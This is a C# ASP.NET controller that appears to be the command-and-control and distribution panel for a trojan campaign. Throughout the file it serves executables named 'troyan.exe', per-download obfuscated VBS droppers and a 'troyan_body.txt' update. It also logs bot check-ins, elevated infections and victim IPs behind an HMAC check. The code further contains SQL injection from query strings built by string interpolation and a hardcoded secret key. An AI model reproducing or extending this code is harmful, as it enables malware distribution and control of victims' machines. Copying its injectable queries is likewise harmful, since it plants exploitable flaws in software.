﻿using System.Data;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using cp.Code;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Data.SqlClient;
using Microsoft.Extensions.Caching.Memory;
using model;

namespace cp.Controllers;

[Route("")]
public class CpController : Controller
{
    private static string RootDataDir => ServerModelLoader.RootDataStatic;

    private const string SecretKey = "YourSecretKeyHere"; // Secret key for hashing
    
    private readonly string _connectionString;



    public static Dictionary<string, string> AdminServers()
    {
        var result = new Dictionary<string, string>();
        var dirs = Directory.GetDirectories(RootDataDir).ToArray();
        foreach (var dir in dirs)
        {
            var password = "password";
            result.Add(dir, Path.GetFileName(dir));
        }
        return result;
    }
    
    private readonly ServerService _serverService;

    private readonly IMemoryCache _memoryCache;
    
    public CpController(ServerService serverService,IConfiguration configuration, IMemoryCache memoryCache)
    {
        _serverService = serverService;
        _connectionString = configuration.GetConnectionString("Default");
        _memoryCache = memoryCache;
    }
    
    private string Server(string server)
    {
        if (Request.Host.Host == "localhost")
            return ServerModelLoader.ipFromHost(ServerModelLoader.DomainControllerStatic);
        if (!string.IsNullOrEmpty(server))
            return ServerModelLoader.ipFromHost(server);
        return ServerModelLoader.ipFromHost(Request.Host.Host);
    }
    
    [HttpGet("{server}/Stats")]
    public async Task<IActionResult> ViewStats(string server)
    {
        server = Server(server);
        var stats = new List<DailyServerSerieStats>();

        try
        {
            using (var connection = new SqlConnection(_connectionString))
            {
                await connection.OpenAsync();
                using (var command = new SqlCommand($"SELECT TOP (1000) [Date], [server], [Serie], [UniqueIDCount], [ElevatedUniqueIDCount],NumberOfDownloads,InstallCount,UnInstallCount FROM [hephaestus].[dbo].[DailyServerSerieStatsView] where server = '{server}' order by date desc", connection))
                {
                    using (var reader = await command.ExecuteReaderAsync())
                    {
                        while (await reader.ReadAsync())
                        {
                            var stat = new DailyServerSerieStats
                            {
                                Date = reader.GetDateTime(reader.GetOrdinal("Date")),
                                Server = reader.GetString(reader.GetOrdinal("server")),
                                Serie = reader.GetString(reader.GetOrdinal("Serie")),
                                UniqueIDCount = reader.GetInt32(reader.GetOrdinal("UniqueIDCount")),
                                ElevatedUniqueIDCount = reader.GetInt32(reader.GetOrdinal("ElevatedUniqueIDCount")),
                                NumberOfDownloads = reader.GetInt32(reader.GetOrdinal("NumberOfDownloads")),
                                InstallCount = reader.GetInt32(reader.GetOrdinal("InstallCount")),
                                UnInstallCount = reader.GetInt32(reader.GetOrdinal("UnInstallCount"))
                            };
                            stats.Add(stat);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // Log the exception (ex) here
            return StatusCode(500, $"Internal server error: {ex.Message}");
        }

        return View("Stats", stats);
    }
    
    [Authorize(Policy = "AllowFromIpRange")]
    [HttpGet("{server}/BotLog")]
    public async Task<IActionResult> BotLog(string server)
    {
        server = Server(server);
        var stats = new List<BotLog>();

        try
        {
            using (var connection = new SqlConnection(_connectionString))
            {
                await connection.OpenAsync();
                using (var command = new SqlCommand($@"SELECT TOP (1000) [id]
      ,[server]
      ,[first_seen]
      ,[last_seen]
      ,[first_seen_ip]
      ,[last_seen_ip]
      ,[serie]
      ,[number]
      ,[number_of_requests]
      ,[number_of_elevated_requests]
      ,[number_of_downloads]
  FROM [hephaestus].[dbo].[BotLogView]
  where server='{server}' order by last_seen desc", connection))
                {
                    using (var reader = await command.ExecuteReaderAsync())
                    {
                        while (await reader.ReadAsync())
                        {
                            var stat = new BotLog()
                            {
                                Id = reader.GetString("id"),
                                Server = reader.GetString(reader.GetOrdinal("server")),
                                LastSeen = reader.GetDateTime(reader.GetOrdinal("last_seen")),
                                LastSeenIp = reader.GetString(reader.GetOrdinal("last_seen_ip")),
                                FirstSeen = reader.GetDateTime(reader.GetOrdinal("first_seen")),
                                FirstSeenIp = reader.GetString(reader.GetOrdinal("first_seen_ip")),
                                Serie = reader.GetString("serie"),
                                Number = reader.GetString("number"),
                                NumberOfRequests =  reader.GetOrdinal("number_of_requests"),
                                NumberOfElevatedRequests =  reader.GetInt32("number_of_elevated_requests"),
                                NumberOfDownloads =  reader.GetInt32("number_of_downloads")
                            };
                            stats.Add(stat);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // Log the exception (ex) here
            return StatusCode(500, $"Internal server error: {ex.Message}");
        }

        return View("BotLog", stats);
    }
    
    
    [Authorize(Policy = "AllowFromIpRange")]
    [HttpGet("{server}/DownloadLog")]
    public async Task<IActionResult> DownloadLog(string server)
    {
        server = Server(server);
        var stats = new List<DownloadLog>();

        try
        {
            using (var connection = new SqlConnection(_connectionString))
            {
                await connection.OpenAsync();
                using (var command = new SqlCommand($@"SELECT TOP (1000) 
        [ip]
      ,[server]
      ,[profile]
      ,[first_seen]
      ,[last_seen]
      ,[number_of_requests]
  FROM [hephaestus].[dbo].[DownloadLogView]
  where server='{server}' order by last_seen desc", connection))
                {
                    using (var reader = await command.ExecuteReaderAsync())
                    {
                        while (await reader.ReadAsync())
                        {
                            var stat = new DownloadLog()
                            {
                                Ip = reader.GetString("ip"),
                                Server = reader.GetString(reader.GetOrdinal("server")),
                                Profile = reader.GetString(reader.GetOrdinal("profile")),
                                FirstSeen = reader.GetDateTime(reader.GetOrdinal("first_seen")),
                                LastSeen = reader.GetDateTime(reader.GetOrdinal("last_seen")),
                                NumberOfRequests =  reader.GetOrdinal("number_of_requests"),
                            };
                            stats.Add(stat);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // Log the exception (ex) here
            return StatusCode(500, $"Internal server error: {ex.Message}");
        }

        return View("DownloadLog", stats);
    }
    
    
    [Authorize(Policy = "AllowFromIpRange")]
    public IActionResult Index()
    {
        var server = Server("");
        return IndexWithServer(server);
    }

    [Authorize(Policy = "AllowFromIpRange")]
    [HttpGet]
    [Route("{server}")]
    public IActionResult IndexWithServer(string server)
    {
        if (server == "favicon.ico")
            return NotFound();
        try
        {
            server = Server(server);
            var serverResult = _serverService.GetServer(server, false);
            return View("Index", serverResult.ServerModel);
        }
        catch (Exception e)
        {
            return View("Index", new ServerModel() {Server = server, Result = e.Message + "\r\n" + e.StackTrace });
        }
    }
    
    [HttpGet("{server}/GetIcon")]
    public IActionResult GetIcon(string server)
    {
        try
        {
            server = Server(server);
            if (!System.IO.File.Exists(_serverService.GetIcon(server)))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetIcon(server));
            Response.Headers.Add("Content-Type", "image/x-icon");
            return File(fileBytes, "image/x-icon");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    protected IActionResult GetFile(string serverFile, string fileName)
    {
        try
        {
            if (!System.IO.File.Exists(serverFile))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(serverFile);
            Response.Headers.Add("Content-Type", "application/octet-stream");
            return File(fileBytes, "application/octet-stream", fileName.Split(".")[0] + "_" + System.Environment.TickCount.ToString() + "." + fileName.Split(".")[1] );
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    [HttpGet("{server}/GetExe")]
    public IActionResult GetExe(string server)
    {
        return GetFile(_serverService.GetExe(server), "troyan.exe");
    }
    
    [HttpGet("{server}/GetExeMono")]
    public IActionResult GetExeMono(string server)
    {
        return GetFile(_serverService.GetExeMono(server), "troyan_mono.exe");
    }
    
    protected async Task<IActionResult> GetFileAdvanced(string server, string file, string name, string random, string target, string randomMethod, string nofile)
    {
        try
        {
            string fileContent;
            if (!_memoryCache.TryGetValue(file, out fileContent))
            {
                fileContent = await VbsRandomer.ReadFileWithRetryAsync($@"C:\data\{server}\{file}", 2, 50);
                var cacheEntryOptions = new MemoryCacheEntryOptions()
                    .SetSlidingExpiration(TimeSpan.FromMinutes(1));
                _memoryCache.Set(file, fileContent, cacheEntryOptions);
            }
            if (randomMethod == "vbs")
                fileContent = VbsRandomer.Modify(fileContent);
            var fileBytes = Encoding.UTF8.GetBytes(fileContent);
            Response.Headers.Add("Content-Type", "text/plain");
            if (nofile == "nofile")
                return Ok(fileContent);
            return File(fileBytes, "text/plain", name.Split(".")[0] + "_" + System.Environment.TickCount.ToString() + "." + name.Split(".")[1] );
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }
    
    [HttpGet("{server}/{profile}/{random}/{target}/DnLog")]
    public async Task<IActionResult> DnLog(string server, string profile, string random, string target)
    {
        var ipAddress = GetIp();
        if (string.IsNullOrWhiteSpace(ipAddress))
            return BadRequest("IP address not found.");
        if (string.IsNullOrWhiteSpace(server))
            return BadRequest("Server address not found.");
        
        await DnLog(server, profile, ipAddress);

        return Ok();
    }
    
    [HttpGet("{server}/{profile}/{random}/{target}/GetVbs")]
    public async Task<IActionResult> GetVbs(string server, string profile, string random, string target)
    {
        var ipAddress = GetIp();
        if (string.IsNullOrWhiteSpace(ipAddress))
            return BadRequest("IP address not found.");
        if (string.IsNullOrWhiteSpace(server))
            return BadRequest("Server address not found.");
        
        await DnLog(server, profile, ipAddress);
        
        return await GetFileAdvanced(server, "troyan.c.vbs", "fun.vbs", random, target, "vbs", "");
    }
    
        
    [HttpGet("{server}/{profile}/GetVbsPhp")]
    public async Task<IActionResult> GetVbsPhp(string server, string profile)
    {
        return await GetFileAdvanced(server, "dn.php", "dn.php", "", "", "","nofile");
    }

    protected async Task DnLog(string server, string profile, string ipAddress)
    {
        using (var connection = new SqlConnection(_connectionString))
        {
            await connection.OpenAsync();

            using (var command = new SqlCommand("dbo.LogDn", connection))
            {
                command.CommandType = CommandType.StoredProcedure;

                command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
                command.Parameters.AddWithValue("@profile", profile ?? (object)DBNull.Value);
                command.Parameters.AddWithValue("@ip", ipAddress);

                await command.ExecuteNonQueryAsync();
            }
        }
    }
    
    protected void ClearStats()
    {
        using (var connection = new SqlConnection(_connectionString))
        {
            connection.Open();

            var command = new SqlCommand( "truncate table dbo.botLog; truncate table dbo.dnLog");
            
                command.CommandType = CommandType.Text;

                command.Connection = connection;

                command.ExecuteNonQuery();
        }
    }
    
    [Authorize(Policy = "AllowFromIpRange")]
    [HttpPost()]
    public IActionResult Index(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
    {
        return IndexWithServer(updatedModel, action, iconFile, newEmbeddings, newFront);
    }

    [Authorize(Policy = "AllowFromIpRange")]
    [HttpPost("{server}", Name = "Index")]
    public IActionResult IndexWithServer(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
    {
        try
        {
            var existingModel = _serverService.GetServer(updatedModel.Server, true).ServerModel;
            if (existingModel == null)
            {
                return NotFound();
            }

            if (action == "reboot")
            {
                var res = _serverService.Reboot();
                return View("Index", new ServerModel() { Server = updatedModel.Server, Result = res });
            }
            
            if (action == "clearstats")
            {
                ClearStats();
                return View("Index", existingModel);
            }

            //embeddingss
            if (newEmbeddings != null && newEmbeddings.Count > 0)
            {
                foreach (var file in newEmbeddings)
                {
                    var filePath = _serverService.GetEmbedding(updatedModel.Server, file.FileName);
                    if (!Directory.Exists(_serverService.EmbeddingsDir(updatedModel.Server)))
                        Directory.CreateDirectory(_serverService.EmbeddingsDir(updatedModel.Server));
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Embeddings.Add(file.FileName);
                }
            }

            var toDeleteEmbeddings = existingModel.Embeddings.Where(a => !updatedModel.Embeddings.Contains(a));
            foreach (var file in toDeleteEmbeddings)
                _serverService.DeleteEmbedding(updatedModel.Server, file);

            //front
            if (newFront != null && newFront.Count > 0)
            {
                foreach (var file in newFront)
                {
                    var filePath = _serverService.GetFront(updatedModel.Server, file.FileName);
                    if (!Directory.Exists(_serverService.FrontDir(updatedModel.Server)))
                        Directory.CreateDirectory(_serverService.FrontDir(updatedModel.Server));
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Front.Add(file.FileName);
                }
            }

            var toDeleteFront = existingModel.Front.Where(a => !updatedModel.Front.Contains(a));
            foreach (var file in toDeleteFront)
                _serverService.DeleteFront(updatedModel.Server, file);

            //icon
            if (iconFile != null && iconFile.Length > 0)
            {
                var filePath = _serverService.GetIcon(updatedModel.Server);

                using (var stream = new FileStream(filePath, FileMode.Create))
                {
                    iconFile.CopyTo(stream);
                }
            }

            updatedModel.Pushes = updatedModel.Pushes
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
            
            updatedModel.StartUrls = updatedModel.StartUrls
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
            
            updatedModel.StartDownloads= updatedModel.StartDownloads
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();

            //model
            existingModel.Server = updatedModel.Server;
            existingModel.Alias = updatedModel.Alias;
            existingModel.StrahServer = updatedModel.StrahServer;
            existingModel.Login = updatedModel.Login;
            existingModel.Password = updatedModel.Password;
            existingModel.Track = updatedModel.Track;
            existingModel.TrackSerie = updatedModel.TrackSerie;
            existingModel.TrackDesktop = updatedModel.TrackDesktop;
            existingModel.AutoStart = updatedModel.AutoStart;
            existingModel.AutoUpdate = updatedModel.AutoUpdate;
            existingModel.PushesForce = updatedModel.PushesForce;
            existingModel.Pushes = updatedModel.Pushes;
            existingModel.StartUrlsForce = updatedModel.StartUrlsForce;
            existingModel.StartUrls = updatedModel.StartUrls;
            existingModel.StartDownloadsForce = updatedModel.StartDownloadsForce;
            existingModel.StartDownloads = updatedModel.StartDownloads;
            existingModel.FrontForce = updatedModel.FrontForce;
            existingModel.Front = updatedModel.Front;
            existingModel.ExtractIconFromFront = updatedModel.ExtractIconFromFront;
            existingModel.EmbeddingsForce = updatedModel.EmbeddingsForce;
            existingModel.Embeddings = updatedModel.Embeddings;
            existingModel.Domains = updatedModel.IpDomains.Values.ToList();
            existingModel.LandingFtp = updatedModel.LandingFtp;
            existingModel.LandingAuto = updatedModel.LandingAuto;
            existingModel.LandingName = updatedModel.LandingName;

            
            existingModel.Bux = updatedModel.Bux;
            existingModel.DnSponsor = updatedModel.DnSponsor;
            existingModel.DisableVirus = updatedModel.DisableVirus;
            
            if (!ContainsUniqueValues(existingModel.Domains))
            {
                return View("Index", new ServerModel() {Server = updatedModel.Server, Result = "Домены должны быть уникальными" });
            }

            //service
            var result = _serverService.PostServer(existingModel.Server, existingModel, action, "kill");

            existingModel.Result = result;
            return View("Index", existingModel);
        }
        catch (Exception e)
        {
            return View("Index", new ServerModel() {Server = updatedModel.Server, Result = e.Message + "\r\n" + e.StackTrace });
        }
    }

    private static bool ContainsUniqueValues(List<string> strings)
    {
        HashSet<string> uniqueStrings = new HashSet<string>();

        foreach (var str in strings)
        {
            if (!uniqueStrings.Add(str))
            {
                // If Add returns false, the string was already in the HashSet
                return false;
            }
        }
        return true;
    }

    
    [Authorize(Policy = "AllowFromIpRange")]
    [HttpGet] [Route("/admin")]
    public IActionResult IndexAdmin()
    {
        return View("admin", new ServerModel(){AdminServers = AdminServers()});
    }

    [Authorize(Policy = "AllowFromIpRange")]
    [HttpPost] [Route("/admin")]
    private IActionResult IndexAdmin(ServerModel updatedModel)
    {
        if (updatedModel.AdminPassword != System.Environment.GetEnvironmentVariable("SuperPassword", EnvironmentVariableTarget.Machine))
        {
            return Unauthorized();
        }

        var was = AdminServers();

        var toDelete = was.Where(a => !updatedModel.AdminServers.ContainsKey(a.Key));
        
        var toAdd = updatedModel.AdminServers.Where(a => !was.ContainsKey(a.Key));


        
        foreach (var server in toDelete)
        {
            ServerUtils.DeleteFolderRecursive(server.Key);
        }
        
        foreach (var server in toAdd)
        {
            _serverService.GetServer(server.Key, false, true, server.Value);
        }
        
        return IndexAdmin();
    }

    protected string GetIp()
    {
        string ipAddress = "unknown";
        try
        {
            ipAddress = HttpContext.Connection.RemoteIpAddress?.ToString();
        }
        catch (Exception e)
        {
            ipAddress = "unknown";
        }

        if (Request.Headers.TryGetValue("HTTP_X_FORWARDED_FOR", out Microsoft.Extensions.Primitives.StringValues value))
        {
            var forwardedFor = value.First();

            ipAddress = string.IsNullOrWhiteSpace(forwardedFor)
                ? ipAddress
                : forwardedFor.Split(',').Select(s => s.Trim()).FirstOrDefault();
        }

        return ipAddress;
    }
    
    [HttpPost("/upsert")]
    [Consumes("application/json")]
    [Produces("application/json")]
    public async Task<IActionResult> UpsertBotLog(
        [FromHeader(Name = "X-Signature")] string xSignature,
        [FromBody] BotLogRequest request)
    {
        var server = BackSvc.GetServer(Request.Host);
        return await UpsertBotLog(server, xSignature, request);
    }
    
    private static JsonSerializerOptions JsonOptions = new JsonSerializerOptions
    {
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
        WriteIndented = false // Ensure compact JSON
    };
   
    
    [HttpPost("{server}/upsert")]
    [Consumes("application/json")]
    [Produces("application/json")]
    public async Task<IActionResult> UpsertBotLog(
        string server,
        [FromHeader(Name = "X-Signature")] string xSignature,
        [FromBody] BotLogRequest request)
    {
        var ipAddress = GetIp();
        if (string.IsNullOrWhiteSpace(ipAddress))
            return BadRequest("IP address not found.");
        if (string.IsNullOrWhiteSpace(server))
            return BadRequest("Server address not found.");
        
        // Serialize the request object to JSON
      

        string jsonBody = JsonSerializer.Serialize(request, JsonOptions);

       if (!ValidateHash(jsonBody, xSignature, SecretKey))
        {
            return Unauthorized("Invalid signature.");
        }

        try
        {
            using (var connection = new SqlConnection(_connectionString))
            {
                await connection.OpenAsync();

                using (var command = new SqlCommand("dbo.UpsertBotLog", connection))
                {
                    command.CommandType = CommandType.StoredProcedure;

                    command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
                    command.Parameters.AddWithValue("@ip", ipAddress);
                    command.Parameters.AddWithValue("@id", request.Id);
                    command.Parameters.AddWithValue("@elevated", request.ElevatedNumber);
                    command.Parameters.AddWithValue("@serie", request.Serie ?? (object)DBNull.Value);
                    command.Parameters.AddWithValue("@number", request.Number ?? (object)DBNull.Value);

                    await command.ExecuteNonQueryAsync();
                }
            }

            return Ok("{}");
        }
        catch (Exception ex)
        {
            // Log the exception (ex) here
            return StatusCode(500, $"Internal server error: {ex.Message}");
        }
    }

    private static bool ValidateHash(string data, string hash, string key)
    {
        using (var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(key)))
        {
            var computedHash = Convert.ToBase64String(hmac.ComputeHash(Encoding.UTF8.GetBytes(data)));
            // Debugging: Print the computed hash
            Console.WriteLine($"Computed hash on server: {computedHash}");
            return computedHash.Equals(hash);
        }
    }
    
    [HttpGet("/update")]
    public IActionResult Update()
    {
        var server = BackSvc.GetServer(Request.Host);
        return Update(server);
    }
   
    [HttpGet("{server}/update")]
    public IActionResult Update(string server)
    {
        var fileBytes = System.IO.File.ReadAllBytes($@"C:\data\{server}\troyan_body.txt");
        return File(fileBytes, "text/plain");
    }
}